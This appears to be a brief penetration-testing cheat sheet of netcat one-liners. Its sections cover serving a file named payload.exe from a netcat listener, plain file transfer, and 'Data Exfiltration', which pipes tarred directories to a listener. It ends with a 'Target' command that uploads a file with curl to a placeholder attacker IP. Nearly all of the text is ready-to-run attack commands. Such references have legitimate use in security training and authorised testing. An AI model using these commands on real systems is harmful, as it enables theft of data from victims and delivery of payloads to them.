# Netcat

## 01 - Simple Web Server

```
$ { echo -ne "HTTP/1.1 200 OK\r\n\r\n"; cat payload.exe; } | nc -lp <PORT> -q 1

$ printf 'HTTP/1.1 200 OK\n\n%s' "$(cat payload.exe)" | nc -lp <PORT> -q 1
```

Run the web server infinitely.

```
$ while true; do { echo -ne "HTTP/1.1 200 OK\r\n\r\n"; cat payload.exe; } | nc -lp <PORT> -q 1; done

$ while true; do printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | nc -lp <PORT> -q 1; done
```

## 02 - Transfer Files

Send files.

```
$ nc -nvv <IP> 1024 -w 10 < file.txt
```

Receive files.

```
$ nc -lnvp 1024 -w 10 > file.txt
```

Even in vice versa just depends how the environment is configured.

## 03 - Data Exfiltration

- Method 1

```
$ nc -l 8080 > directory_data.tar.gz

$ tar cfvz - directory_data | nc -w 15 <IP> 8080 directory_data

$ tar xzf directory_data.tar.gz
```

- Method 2

```
$ nc -l 8080 | tar xzvf -

$ tar czf - directory_data | nc <IP> 8080
```

### 3.1 - HTTP Server

```
$ nc -lnvp 4040 | tee file.txt
```

### 3.2 - Target

```
$ curl -T file.txt http://<attacker_IP>:4040
```